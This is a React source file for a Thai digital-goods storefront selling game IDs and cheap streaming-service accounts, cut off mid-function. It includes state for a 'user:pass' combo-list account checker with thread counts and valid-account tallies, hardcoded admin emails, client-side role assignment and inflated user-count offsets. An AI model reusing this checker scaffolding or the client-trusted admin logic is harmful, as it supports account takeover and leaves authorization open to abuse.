import {
  BrowserRouter,
  Routes,
  Route,
  useNavigate,
  useLocation,
} from "react-router-dom";
import React, {
  useState,
  useRef,
  useEffect,
  useCallback,
  Suspense,
  lazy,
} from "react";
import { sanitizeCategories } from "./utils";
import {
  Loader,
  Gamepad2,
  ListChecks,
  Play,
  Square,
  Check,
  X,
  Shield,
  Terminal,
  CheckCircle2,
  Home,
  ShoppingCart,
  CreditCard,
  Phone,
  Upload,
  Key,
  Crown,
  LogOut,
  User,
  Gift,
  Lock,
  FileImage,
  Database,
  Globe,
  Mail,
  BarChart3,
  Settings,
  Activity,
  FileText,
  AlertTriangle,
  Download,
  ChevronRight,
  ChevronDown,
  ChevronUp,
  Trash2,
  ShieldAlert,
  Plus,
  Ban,
  History,
  Search,
  Copy,
  Menu,
  Server,
  Package,
  Wallet,
  Coins,
  MessageSquare,
  Bot,
  Image as ImageIcon,
  LogIn,
  UserPlus,
  ArrowUpRight,
  Zap,
  Music,
  ShieldCheck,
  ShoppingBag,
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import Swal from "sweetalert2";
import axios from "axios";
import axiosRetry from "axios-retry";

axiosRetry(axios, {
  retries: 3,
  retryDelay: axiosRetry.exponentialDelay,
  retryCondition: (error) => {
    // Only retry on network errors or 5xx errors.
    // Do NOT retry on 409 (Conflict/OCC) or other client errors.
    return axiosRetry.isNetworkOrIdempotentRequestError(error) || error.response?.status === 429;
  }
});
import { supabase as auth } from "./lib/supabase"; // auth here refers to supabase

// Add JWT refresh interceptor for 401 Unauthorized
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    if (
      error.response?.status === 401 && 
      !originalRequest._retry &&
      !originalRequest.url?.includes('/api/signup') &&
      !originalRequest.url?.includes('/api/reset-password')
    ) {
      originalRequest._retry = true;
      try {
        const { data: { session }, error: refreshError } = await auth.auth.getSession();
        if (session?.access_token && !refreshError) {
          axios.defaults.headers.common["Authorization"] = `Bearer ${session.access_token}`;
          originalRequest.headers["Authorization"] = `Bearer ${session.access_token}`;
          return axios(originalRequest);
        }
      } catch (refreshErr) {
        console.error("JWT Refresh failed:", refreshErr);
      }
    }
    return Promise.reject(error);
  }
);

type SupabaseUser = any;
import { Turnstile } from "@marsidev/react-turnstile";
import { Analytics } from "@vercel/analytics/react";
import { SpeedInsights } from "@vercel/speed-insights/react";
import { useToastStore } from "./lib/toastStore";
import { ToastContainer } from "./components/ui/Toast";
import { GlobalErrorBoundary } from "./components/GlobalErrorBoundary";
import { AccountResult, LogEntry, UserPlan } from "./types";
const KeyModal = lazy(() => import("./components/modals/KeyModal").then(m => ({ default: m.KeyModal })));
const ReceiptModal = lazy(() => import("./components/modals/ReceiptModal").then(m => ({ default: m.ReceiptModal })));
const PopupBanner = lazy(() => import("./components/PopupBanner").then(m => ({ default: m.PopupBanner })));
import { Product, SiteStats, Category } from "./types";
import { getAvatarUrl } from "./lib/avatar";
import { getUserRank } from "./lib/rank";
import {
  HomeIcon,
  ShopIcon,
  CoinsIcon,
  ContactIcon,
  UserIcon,
  GearIcon,
  WalletIcon,
  BagIcon,
  ChevronDownIcon,
  SunnyBuxLogo,
} from "./components/SunnyComponents";

const ProfileView = lazy(() => import("./components/ProfileView").then((m) => ({ default: m.ProfileView })));
const CategoriesView = lazy(() => import("./components/CategoriesView").then((m) => ({ default: m.CategoriesView })));
const AuthView = lazy(() => import("./components/AuthView").then((m) => ({ default: m.AuthView })));
const HomeView = lazy(() => import("./components/HomeView").then((m) => ({ default: m.HomeView })));
const ProductDetailView = lazy(() => import("./components/ProductDetailView").then((m) => ({ default: m.ProductDetailView })));
const MyOrdersView = lazy(() => import("./components/MyOrdersView").then((m) => ({ default: m.MyOrdersView })));
const CategoryProductsView = lazy(() => import("./components/CategoryProductsView").then((m) => ({ default: m.CategoryProductsView })));
const SearchView = lazy(() => import("./components/SearchView").then((m) => ({ default: m.SearchView })));

import { SkeletonHomeLoader, SkeletonGenericLoader } from "./components/SkeletonLoader";

const AdminDashboard = lazy(() =>
  import("./components/AdminDashboard").then((module) => ({
    default: module.AdminDashboard,
  })),
);
const PageView = lazy(() =>
  import("./components/PageView").then((module) => ({
    default: module.PageView,
  })),
);
const HistoryLogsView = lazy(() =>
  import("./components/HistoryLogsView").then((module) => ({
    default: module.HistoryLogsView,
  })),
);
const WalletView = lazy(() =>
  import("./components/WalletView").then((module) => ({
    default: module.WalletView,
  })),
);
const RedeemKeyView = lazy(() =>
  import("./components/RedeemKeyView").then((module) => ({
    default: module.RedeemKeyView,
  })),
);
const historyImport = () => import("./components/HistoryView");
const HistoryView = lazy(() =>
  historyImport().then((module) => ({
    default: module.HistoryView,
  })),
);
const CheckerLogsView = lazy(() =>
  import("./components/CheckerLogsView").then((module) => ({
    default: module.CheckerLogsView,
  })),
);

const ContactView = lazy(() =>
  import("./components/ContactView").then((module) => ({
    default: module.ContactView,
  })),
);
const ApiProxyGenTool = lazy(() =>
  import("./components/ApiProxyGenTool").then((module) => ({
    default: module.ApiProxyGenTool,
  })),
);
const AutoDeployTool = lazy(() =>
  import("./components/AutoDeployTool").then((module) => ({
    default: module.AutoDeployTool,
  })),
);
const ProxyFreeTool = lazy(() =>
  import("./components/ProxyFreeTool").then((module) => ({
    default: module.ProxyFreeTool,
  })),
);
const settingsImport = () => import("./components/SettingsView");
const SettingsView = lazy(() =>
  settingsImport().then((module) => ({
    default: module.SettingsView,
  })),
);
const toolsImport = () => import("./components/ToolsView");
const ToolsView = lazy(() =>
  toolsImport().then((module) => ({
    default: module.ToolsView,
  })),
);
const LogCategoriesView = lazy(() =>
  import("./components/LogCategoriesView").then((module) => ({
    default: module.LogCategoriesView,
  })),
);
const TwoFAGenerator = lazy(() =>
  import("./components/TwoFAGenerator").then((module) => ({
    default: module.TwoFAGenerator,
  })),
);

import { CustomCursor } from "./components/CustomCursor";

var TextPaint = `▒▄▀▄▒█▀▄▒██▀░▀▄▀
2
░█▀█░█▀▒░█▄▄░█▒█`;

enum OperationType {
  CREATE = "create",
  UPDATE = "update",
  DELETE = "delete",
  LIST = "list",
  GET = "get",
  WRITE = "write",
  AUTH = "auth",
}

function ElapsedTimeDisplay({
  running,
  startTime,
}: {
  running: boolean;
  startTime: number | null;
}) {
  const [elapsedTime, setElapsedTime] = useState("00:00:00.000");

  useEffect(() => {
    let timer: any;
    if (running && startTime) {
      timer = setInterval(() => {
        const now = performance.now();
        const diff = now - startTime;
        const hours = Math.floor(diff / 3600000)
          .toString()
          .padStart(2, "0");
        const minutes = Math.floor((diff % 3600000) / 60000)
          .toString()
          .padStart(2, "0");
        const seconds = Math.floor((diff % 60000) / 1000)
          .toString()
          .padStart(2, "0");
        const ms = Math.floor(diff % 1000)
          .toString()
          .padStart(3, "0");
        setElapsedTime(`${hours}:${minutes}:${seconds}.${ms}`);
      }, 67);
    }
    return () => clearInterval(timer);
  }, [running, startTime]);

  if (elapsedTime === "00:00:00.000") return null;
  return (
    <div className="px-3 py-1 bg-[#09090b] border border-[#1e1e1e] border text-xs font-mono text-muted-foreground font-medium">
      {elapsedTime}
    </div>
  );
}

function ComboTextarea({
  initialValue,
  onChangeDebounced,
  disabled,
}: {
  initialValue: string;
  onChangeDebounced: (val: string) => void;
  disabled: boolean;
}) {
  const [val, setVal] = useState(initialValue);
  const timerRef = useRef<any>(null);

  useEffect(() => {
    if (initialValue && initialValue !== val) {
      setVal(initialValue);
    }
  }, [initialValue]);

  const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const newVal = e.target.value;
    setVal(newVal);
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      onChangeDebounced(newVal);
    }, 400); // 400ms debounce
  };

  return (
    <textarea
      value={val}
      onChange={handleChange}
      rows={12}
      disabled={disabled}
      className={`w-full bg-[#09090b] border border-[#1e1e1e] border p-3 text-[11px] font-mono text-[#10b981] focus:border-emerald-500/50 focus:outline-none resize-none transition-all scrollbar-thin scrollbar-thumb-zinc-800 h-[320px] ${disabled ? "opacity-50 cursor-not-allowed" : ""}`}
      placeholder={"user:pass\nuser|pass"}
      spellCheck="false"
    />
  );
}

function AppContent() {
  const [isAdmin, setIsAdmin] = useState(false);
  const [adminUsername, setAdminUsername] = useState("");
  const [adminPassword, setAdminPassword] = useState("");
  const [user, setUser] = useState<SupabaseUser | null>(null);
  const [userPlan, setUserPlan] = useState<UserPlan | null>(null);
  const [siteSettings, setSiteSettings] = useState(() => {
    const defaultSettings = {
      site_name: "APEXSTORE",
      truewallet_phone: "",
      contact_line: "https://www.facebook.com/share/18emwBsqUf/?mibextid=wwXIfr",
      discord_link: "",
      facebook_link: "",
      instagram_link: "",
      contact_email: "support.apexstoreth@gmail.com",
      popup_enabled: false,
      popup_img_url: "",
      popup_link: "",
      stats_users_offset: 1278,
      stats_sales_offset: 0,
      spotify_url: "https://youtu.be/WczSfh3gJaU?si=PI1i4X0p0FGbdEfq",
      spotify_autoplay: true,
      announcement_text: "ยินดีต้อนรับสู่ APEXSTORE ศูนย์รวมสินค้าไอดีและข้อเสนอยอดฮิต ระบบซื้อขายทำงานอัตโนมัติ 24 ชั่วโมง - กรณีมีปัญหาโปรดติดต่อแอดมิน",
    };
    try {
      const saved = localStorage.getItem("apex_settings_cache");
      return saved ? JSON.parse(saved) : defaultSettings;
    } catch {
      return defaultSettings;
    }
  });

  const [deferMedia, setDeferMedia] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => {
      setDeferMedia(false);
    }, 2500);
    return () => clearTimeout(timer);
  }, []);

  // Removed music state and useEffects

  // Home Store State (Moved up to prevent TDZ)
  const defaultProducts: Product[] = [
    {
      id: "rov_standard",
      name: "ไอดีเกม RoV ระดับพรีเมียม (สกินอลังการ พร้อมไต่แรงก์)",
      price: 390,
      originalPrice: 450,
      category: "ไอดีเกมส์ยอดนิยม",
      stock: 5,
      soldCount: 142,
      imageUrl: "https://seeklogo.com/images/A/arena-of-valor-logo-1BDD4A191C-seeklogo.com.png",
      description: "ประวัติขาวสะอาด ไม่เคยโดนแบน ฮีโร่ครบ สกินเพียบพร้อมรูนเลเวล 90 ทุกสาย",
      isPopular: true
    },
    {
      id: "netflix_4k",
      name: "Netflix Premium Ultra HD 4K (30 วัน - จอส่วนตัว)",
      price: 139,
      originalPrice: 199,
      category: "แอปพรีเมียม / บันเทิง",
      stock: 12,
      soldCount: 945,
      imageUrl: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png",
      description: "ความละเอียด 4K HDR เสียงรอบทิศทาง ใช้งานส่วนตัว เสถียรสูง 100% ตลอดทั้งเดือน",
      isPopular: true
    },
    {
      id: "youtube_premium",
      name: "YouTube Premium 4K (30 วัน - บัญชีส่วนตัวความปลอดภัยสูง)",
      price: 39,
      originalPrice: 69,
      category: "แอปพรีเมียม / บันเทิง",
      stock: 24,
      soldCount: 1248,
      imageUrl: "https://upload.wikimedia.org/wikipedia/commons/e/e1/Logo_of_YouTube_%282015-2017%29.svg",
      description: "ไม่มีโฆษณาคั่นอย่างสมบูรณ์ เล่นขณะปิดหน้าจอได้ แถมบริการเสริม Youtube Music HQ",
      isPopular: true
    },
    {
      id: "discord_nitro",
      name: "Discord Nitro Premium Gift (1 เดือน - บัญชีแท้ 100%)",
      price: 119,
      originalPrice: 320,
      category: "แอปพรีเมียม / บันเทิง",
      stock: 8,
      soldCount: 231,
      imageUrl: "https://upload.wikimedia.org/wikipedia/commons/c/ca/Discord_Color_Logo.svg",
      description: "รับบูสเซิร์ฟเวอร์ฟรี x2 สติกเกอร์เคลื่นไหว อีโมจิพิเศษทุกเซิร์ฟ และแชร์จอ 1080p 60fps",
      isPopular: true
    },
    {
      id: "spotify_premium",
      name: "Spotify Premium Personal (30 วัน - ปลดล็อคเสียงระดับ Hi-Fi)",
      price: 29,
      originalPrice: 129,
      category: "แอปพรีเมียม / บันเทิง",
      stock: 18,
      soldCount: 412,
      imageUrl: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg",
      description: "ดาวน์โหลดเพลงฟังแบบออฟไลน์ บิตเรตเสียงคมชัดสูงสุด 320kbps ข้ามเพลงแบบไร้ขีดจำกัด",
      isPopular: false
    }
  ];

  const [products, setProducts] = useState<Product[]>(() => {
    try {
      const saved = localStorage.getItem("apex_products_cache");
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
      }
    } catch (e) {}
    return defaultProducts;
  });

  const [siteStats, setSiteStats] = useState<SiteStats>(() => {
    const defaultStats = {
      users: 1548,
      stock: 890,
      sales: 332,
      topups: 125400,
    };
    try {
      const saved = localStorage.getItem("apex_stats_cache");
      return saved ? JSON.parse(saved) : defaultStats;
    } catch {
      return defaultStats;
    }
  });

  const [customPages, setCustomPages] = useState<any[]>(() => {
    try {
      const saved = localStorage.getItem("apex_pages_cache");
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  const [categories, setCategories] = useState<any[]>(() => {
    try {
      const saved = localStorage.getItem("apex_categories_cache");
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return sanitizeCategories(parsed);
      }
    } catch (e) {}
    return [
      { id: "premium_app", name: "แอปพรีเมียม / บันเทิง", title: "แอปพรีเมียม / บันเทิง" },
      { id: "gaming_id", name: "ไอดีเกมส์ยอดนิยม", title: "ไอดีเกมส์ยอดนิยม" },
      { id: "license_key", name: "คีย์ใบอนุญาต / โปรแกรม", title: "คีย์ใบอนุญาต / โปรแกรม" },
      { id: "proxy", name: "พร็อกซีเซสชั่นขั้นสูง", title: "พร็อกซีเซสชั่นขั้นสูง" }
    ];
  });

  const [selectedPage, setSelectedPage] = useState<any>(null);

  const [threads, setThreads] = useState(5);
  const [licenseKeys, setLicenseKeys] = useState<any[]>([]);
  const [usedKeysHistory, setUsedKeysHistory] = useState<any[]>([]);
  const [blockedIPs, setBlockedIPs] = useState<any[]>([]);
  const [adminTab, setAdminTab] = useState<string>("overview");
  const [isIPBlocked, setIsIPBlocked] = useState(false);
  const [lastUsageDate, setLastUsageDate] = useState<string>("");
  const [showKeyModal, setShowKeyModal] = useState(false);

  // Navigation State
  type ViewType =
    | "home"
    | "search"
    | "categories"
    | "category_products"
    | "dashboard"
    | "telegram_catcher"
    | "discord_catcher"
    | "discord_on"
    | "discord_badge"
    | "two_fa_generator"
    | "proxy_ff_ios"
    | "proxy_free"
    | "api_proxy_gen"
    | "auto_deploy"
    | "admin"
    | "profile"
    | "logs"
    | "checker_logs"
    | "history"
    | "wallet_history"
    | "order_history"
    | "random_history"
    | "settings"
    | "contact"
    | "login"
    | "signup"
    | "wallet"
    | "redeem"
    | "product_detail"
    | "custom_page"
    | "log_categories"
    | "tools"
    | "vip_logs"
    | "free_logs"
    | "my_orders";
  
  const [language, setLanguage] = useState<"th" | "en">("th");

  const [activeView, setRawActiveView] = useState<ViewType>(() => {
    let path = window.location.pathname;
    if (path.startsWith("/accounts/signin")) return "login";
    
    let targetPath = path.replace("/", "");
    const parts = targetPath.split('/').filter(Boolean);
    if (parts[0] === "th" || parts[0] === "en") {
      targetPath = parts[1] || "home";
    }
    if (targetPath === "" || targetPath === "th" || targetPath === "en") return "home";

    const hostname = window.location.hostname;
    if (hostname.startsWith("account.")) return "login";
    if (hostname.startsWith("dash.")) return "dashboard";
    
    // Fallback views mapping handled in useEffect mostly, but initial load logic here:
    if (targetPath === "register") return "signup";
    if (targetPath === "topup") return "wallet";
    if (targetPath === "store") return "categories";
    
    const validViews = ["landing", "home", "search", "categories", "category_products", "dashboard", "admin", "profile", "logs", "checker_logs", "history", "wallet_history", "order_history", "random_history", "settings", "contact", "login", "signup", "wallet", "redeem", "product_detail", "custom_page", "log_categories", "tools", "vip_logs", "free_logs", "my_orders"];
    if (validViews.includes(targetPath)) return targetPath as ViewType;
    
    return "home";
  });
  const [selectedProductId, setSelectedProductId] = useState<string | null>(
    null,
  );
  const [selectedCategory, setSelectedCategory] = useState<string | null>(
    "all",
  );
  const [usersList, setUsersList] = useState<any[]>([]);

  const setActiveView = useCallback(
    (view: any) => {
      if (activeView === view) return;
      let newPath = "";
      if (view === "login" || view === "signup") {
        newPath = "/accounts/signin";
      } else {
        const pathSuffix = view === "home" ? "" : view;
        newPath = `/${language}${pathSuffix ? '/' + pathSuffix : ''}`;
      }
      window.history.pushState(null, "", newPath);
      setRawActiveView(view);
    },
    [activeView, language],
  );

  // Handle URL pathname routing
  useEffect(() => {
    const handlePopState = () => {
      let path = window.location.pathname;
      if (path.startsWith("/accounts/signin")) {
        setRawActiveView("login");
        return;
      }
      
      const parts = path.split('/').filter(Boolean);
      let targetPath = "home";
      if (parts[0] === "th" || parts[0] === "en") {
        setLanguage(parts[0] as "th" | "en");
        targetPath = parts[1] || "home";
      } else {
        targetPath = parts[0] || "home";
      }

      if (targetPath === "") {
        const hostname = window.location.hostname;
        if (hostname.startsWith("account.")) targetPath = "login";
        else if (hostname.startsWith("dash.")) targetPath = "dashboard";
        else targetPath = "home";
      }

      // Routing aliases
      if (targetPath === "register") targetPath = "signup";
      if (targetPath === "topup") targetPath = "wallet";
      if (targetPath === "store") targetPath = "categories";

      const validViews = [
        "landing",
        "home",
        "search",
        "categories",
        "category_products",
        "dashboard",
        "telegram_catcher",
        "discord_catcher",
        "discord_on",
        "discord_badge",
        "two_fa_generator",
        "api_proxy_gen",
        "proxy_free",
        "admin",
        "profile",
        "logs",
        "checker_logs",
        "history",
        "settings",
        "contact",
        "login",
        "signup",
        "wallet",
        "redeem",
        "product_detail",
        "custom_page",
        "log_categories",
        "tools",
        "vip_logs",
        "free_logs",
        "order_history",
        "random_history",
        "wallet_history",
        "my_orders"
      ];

      if (targetPath && validViews.includes(targetPath)) {
        if (targetPath !== activeView) {
          setRawActiveView(targetPath as any);
        }
      } else if (targetPath === "home" && activeView !== "home") {
        setRawActiveView("home");
      }
    };

    // Initial check on mount
    handlePopState();

    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [activeView]);

  useEffect(() => {
    if (products.length > 0) {
      const params = new URLSearchParams(window.location.search);
      const pid = params.get("product");
      if (pid) {
        const p = products.find(prod => prod.id === pid);
        if (p && activeView !== "product_detail") {
          setSelectedProductId(pid);
          setRawActiveView("product_detail");
          window.history.replaceState(null, "", "/product_detail?product=" + pid);
        }
      }
    }
  }, [products, activeView]);

  useEffect(() => {
    if (isAdmin) {
      document.body.classList.add("admin-mode");
    } else {
      document.body.classList.remove("admin-mode");
    }
  }, [isAdmin]);

  const [combo, setCombo] = useState("");
  const comboRef = useRef("");
  const [running, setRunning] = useState(false);
  const runningRef = useRef(false);
  const [validAccounts, setValidAccounts] = useState<AccountResult[]>([]);
  const [invalidCount, setInvalidCount] = useState(0);
  const [totalChecked, setTotalChecked] = useState(0);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const logDivRef = useRef<HTMLDivElement>(null);

  const [startTime, setStartTime] = useState<number | null>(null);

  const [showPrivacy, setShowPrivacy] = useState(false);
  const [showTerms, setShowTerms] = useState(false);
  const [showAboutUs, setShowAboutUs] = useState(false);
  const [showContactUs, setShowContactUs] = useState(false);
  const [showSearchPopup, setShowSearchPopup] = useState(false);
  const [clientIp, setClientIp] = useState<string | null>(null);
  const [isLoaded, setIsLoaded] = useState(false);
  const [forceReveal, setForceReveal] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);

  const [logoClicks, setLogoClicks] = useState(0);
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [dailyUsage, setDailyUsage] = useState<number>(0);
  const [showTurnstileModal, setShowTurnstileModal] = useState(false);
  const [pendingTurnstileToken, setPendingTurnstileToken] = useState<
    string | null
  >(null);
  const [savedLinesToCheck, setSavedLinesToCheck] = useState<string[]>([]);
  const rawEnvKey = (import.meta.env.TURNSTILE_SITE_KEY || "").trim();
  const TURNSTILE_SITE_KEY =
    rawEnvKey.length > 5 ? rawEnvKey : "0x4AAAAAADDNPyGBIV4MApep";

  function handleDbError(
    error: unknown,
    operationType: OperationType,
    path: string | null,
  ) {
    const errInfo = {
      error: error instanceof Error ? error.message : String(error),
      authInfo: {
        userId: (window as any)._user?.id,
      },
      operationType,
      path,
    };
    console.error("Database Error: ", JSON.stringify(errInfo));
  }

  const addToast = useToastStore((state) => state.addToast);

  const handleCopy = (text: string, title?: string) => {
    navigator.clipboard.writeText(text);
    addToast({
      type: "success",
      title: title || "สำเร็จ",
      message: "คัดลอกลงในคลิปบอร์ดแล้ว",
      duration: 3000
    });
  };
  const [isUserMenuOpen, setIsUserMenuOpen] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isDesktopToolsOpen, setIsDesktopToolsOpen] = useState(false);
  const [isMobileToolsOpen, setIsMobileToolsOpen] = useState(false);

  useEffect(() => {
    if (isMobileMenuOpen) {
      document.body.style.overflow = "hidden";
      document.documentElement.style.overflow = "hidden";
    } else {
      document.body.style.overflow = "";
      document.documentElement.style.overflow = "";
    }
    return () => {
      document.body.style.overflow = "";
      document.documentElement.style.overflow = "";
    };
  }, [isMobileMenuOpen]);

  const [vipTab, setVipTab] = useState<"key">("key");

  const [purchaseHistory, setPurchaseHistory] = useState<any[]>([]);

  const [topupHistory, setTopupHistory] = useState<any[]>([]);

  const [purchasesNextCursor, setPurchasesNextCursor] = useState<string | null>(null);
  const [isAdminDataLoading, setIsAdminDataLoading] = useState(false);

  useEffect(() => {
    // Topup history is user-specific, we do not cache it in localStorage.
  }, [topupHistory]);

  const handlePurchase = async (product: Product, quantity: number = 1) => {
    if (!product.isPreOrder && product.stock < quantity) {
      Swal.fire({
        icon: "error",
        title: "สินค้าไม่เพียงพอ",
        text: "สินค้าหน้านี้มีสต๊อกไม่พอสำหรับจำนวนที่คุณต้องการ",
        confirmButtonColor: "#dc2626",
      });
      return;
    }

    const totalPrice = product.price * quantity;

    if (!userPlan || (userPlan.balance || 0) < totalPrice) {
      Swal.fire({
        icon: "error",
        title: "ยอดเงินไม่เพียงพอ",
        text: `กรุณาเติมเงินก่อนทำการสั่งซื้อสินค้า (ยอดรวม: ฿${totalPrice.toLocaleString()})`,
        confirmButtonColor: "#dc2626",
      });
      return;
    }

    // Capture Pre-order option selection
    let selectedOption = "";
    if (product.isPreOrder) {
      const opts = product.preOrderOptions || [];
      if (opts.length > 0) {
        const optionsObject: any = {};
        opts.forEach(o => {
          optionsObject[o] = o;
        });

        const result = await Swal.fire({
          title: 'เลือกประเภทไอดีที่ต้องการ Pre-Order',
          input: 'select',
          inputOptions: optionsObject,
          inputPlaceholder: 'กรุณาเลือกประเภทไอดี...',
          showCancelButton: true,
          confirmButtonText: 'ยืนยัน',
          cancelButtonText: 'ยกเลิก',
          inputValidator: (value) => {
            return !value ? 'กรุณาเลือกประเภทไอดีเพื่อดำเนินการต่อ' : '';
          },
          background: '#09090b',
          color: '#fff',
          confirmButtonColor: '#10b981',
          cancelButtonColor: '#27272a'
        });

        if (result.isDismissed || !result.value) {
          return; // Cancel purchase
        }
        selectedOption = result.value;
      } else {
        // Text input as fallback
        const result = await Swal.fire({
          title: 'ระบุประเภทไอดีที่ต้องการ Pre-Order',
          input: 'text',
          inputPlaceholder: 'ระบุประเภทรหัส/ไอดี เช่น เลเวล 30, ไอดีสะอาด...',
          showCancelButton: true,
          confirmButtonText: 'ยืนยัน',
          cancelButtonText: 'ยกเลิก',
          inputValidator: (value) => {
            return !value ? 'กรุณาระบุรายละเอียดเพื่อดำเนินการต่อ' : '';
          },
          background: '#09090b',
          color: '#fff',
          confirmButtonColor: '#10b981',
          cancelButtonColor: '#27272a'
        });

        if (result.isDismissed || !result.value) {
          return; // Cancel purchase
        }
        selectedOption = result.value;
      }
    }

    try {
      const idempotencyKey = `buy_${product.id}_${Date.now()}_${Math.random()}`;
      const res = await axios.post("/api/buy", {
        productId: product.id,
        quantity,
        preOrderOption: selectedOption
      }, {
        headers: {
          'Idempotency-Key': idempotencyKey
        }
      });
      const {
        purchase: newHistoryItem,
        updatedUser,
        updatedProduct,
      } = res.data;

      // Update state with result from server
      setProducts((prevProducts) =>
        prevProducts.map((p) => (p.id === product.id ? updatedProduct : p)),
      );
      setUserPlan(updatedUser);
      setPurchaseHistory((prev) => [newHistoryItem, ...prev]);

      // Update site stats for admin
      setSiteStats((prev) => ({
        ...prev,
        sales: prev.sales + totalPrice,
        stock: Math.max(0, prev.stock - quantity),
      }));

      // Create and auto download TXT file of purchased items, if quantity > 1
      if (quantity > 1) {
        const blob = new Blob([newHistoryItem.secretData], {
          type: "text/plain;charset=utf-8",
        });
        const url = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.href = url;
        link.download = `apexstore_order_${product.id}_x${quantity}_${new Date().toISOString().slice(0, 10)}.txt`;
        link.click();
        URL.revokeObjectURL(url);
      }

      // Show success and redirect
      Swal.fire({
        icon: "success",
        title: "สั่งซื้อสำเร็จ!",
        text:
          quantity === 1
            ? `คุณได้สั่งซื้อ ${product.name} สำเร็จแล้ว`
            : "ระบบได้ดาวน์โหลดไฟล์คีย์/ข้อมูลสินค้าให้ท่านอัตโนมัติ (และสามารถตรวจสอบย้อนหลังได้ที่ประวัติการสั่งซื้อ)",
        confirmButtonColor: "#16a34a",
        confirmButtonText: "ตกลง",
      }).then(() => {
        setActiveView("history");
        if (quantity === 1) {
          setPurchasedItemReceipt({
            ...newHistoryItem,
            title: "สั่งซื้อสำเร็จ",
            icon: ShoppingCart,
            bg: "bg-[#10b981]",
            color: "text-white",
          });
        }
      });
    } catch (err: any) {
      console.error("Purchase error:", err);
      const errorMessage = err.response?.data?.error;
      
      if (errorMessage === "สินค้าในสต๊อกไม่เพียงพอ") {
        Swal.fire({
          icon: "error",
          title: "ขออภัย",
          text: "สินค้าชิ้นนี้เพิ่งหมดไป หรือจำนวนในสต๊อกไม่เพียงพอ",
          confirmButtonColor: "#dc2626",
        });
        
        // Refetch to update stock and disable button
        axios.get("/api/products")
          .then((res) => {
             if (res.data && Array.isArray(res.data)) {
                setProducts(res.data);
                // Also update selected product if we are on the detail page
                if (activeView === "product_detail") {
                   const updated = res.data.find((p: any) => p.id === product.id);
                   if (updated && updated.stock === 0) {
                      // Handled by UI automatically via products state propagation
                   }
                }
             }
          }).catch(console.error);
      } else {
        Swal.fire({
          icon: "error",
          title: "เกิดข้อผิดพลาด",
          text:
            errorMessage ||
            "ไม่สามารถทำรายการได้ในขณะนี้ กรุณาลองใหม่",
          confirmButtonColor: "#dc2626",
        });
      }
    }
  };

  const [isDBReady, setIsDBReady] = useState(false);
  const [dbErrorDetail, setDbErrorDetail] = useState<string | null>(null);
  const [purchasedItemReceipt, setPurchasedItemReceipt] = useState<any>(null);

  // Product + Stats loaders - No localStorage fallback, trust API
  useEffect(() => {}, []);

  const syncUserPlan = useCallback(
    async (newPlan: UserPlan | null, uid: string) => {
      if (!newPlan || !uid) return;
      try {
        await axios.post(`/api/users/${uid}`, newPlan);
      } catch (err) {
        console.error("Failed to sync user plan:", err);
      }
    },
    [],
  );

  // Firebase Auth Listener
  useEffect(() => {
    // Check initial session
    auth.auth.getSession().then(({ data: { session } }) => {
      if (session?.access_token) {
        axios.defaults.headers.common["Authorization"] =
          `Bearer ${session.access_token}`;
      } else {
        delete axios.defaults.headers.common["Authorization"];
      }

      const currentUser: any = session?.user || null;
      if (currentUser) currentUser.uid = currentUser.id;
      setUser(currentUser);
      if (
        currentUser &&
        (currentUser.email === "abopboa.b@gmail.com" ||
          currentUser.email === "admin_apex@apex-studio.com" ||
          currentUser.email === "admin@apex-studio.com")
      ) {
        setIsAdmin(true);
      }
    });

    const {
      data: { subscription },
    } = auth.auth.onAuthStateChange(async (event, session) => {
      if (session?.access_token) {
        axios.defaults.headers.common["Authorization"] =
          `Bearer ${session.access_token}`;
      } else {
        delete axios.defaults.headers.common["Authorization"];
      }

      const currentUser: any = session?.user || null;
      if (currentUser) currentUser.uid = currentUser.id;
      setUser(currentUser);
      if (
        currentUser &&
        (currentUser.email === "abopboa.b@gmail.com" ||
          currentUser.email === "admin_apex@apex-studio.com" ||
          currentUser.email === "admin@apex-studio.com")
      ) {
        setIsAdmin(true);
      } else {
        setIsAdmin(false);
      }

      if (currentUser && !currentUser.isAnonymous && currentUser.email) {
        try {
          // Fetch user plan from backend
          const res = await axios.get(`/api/users/${currentUser.uid}`);
          if (res.data) {
            setUserPlan(res.data);
            if (res.data.role === "Admin" || res.data.role === "admin") {
              setIsAdmin(true);
            }
          } else {
            // First time user registration on backend
            const initialPlan = {
              username:
                currentUser.displayName || currentUser.email.split("@")[0],
              isPremium: false,
              premiumExpireDate: null,
              balance: 0,
              email: currentUser.email,
              role:
                currentUser.email === "abopboa.b@gmail.com" ||
                currentUser.email === "admin_apex@apex-studio.com" ||
                currentUser.email === "admin@apex-studio.com"
                  ? "Admin"
                  : "Member",
            };
            setUserPlan(initialPlan);
            if (initialPlan.role === "Admin") setIsAdmin(true);
            await axios.post(`/api/users/${currentUser.uid}`, initialPlan);
          }
        } catch (err: any) {
          if (err.response?.status === 404) {
            const initialPlan = {
              username:
                currentUser.displayName || currentUser.email.split("@")[0],
              isPremium: false,
              premiumExpireDate: null,
              balance: 0,
              email: currentUser.email,
              role:
                currentUser.email === "abopboa.b@gmail.com" ||
                currentUser.email === "admin_apex@apex-studio.com" ||
                currentUser.email === "admin@apex-studio.com"
                  ? "Admin"
                  : "Member",
            };
            setUserPlan(initialPlan);
            if (initialPlan.role === "Admin") setIsAdmin(true);
            try {
              await axios.post(`/api/users/${currentUser.uid}`, initialPlan);
            } catch (postErr) {
              console.error("Failed to create initial user plan:", postErr);
            }
          } else {
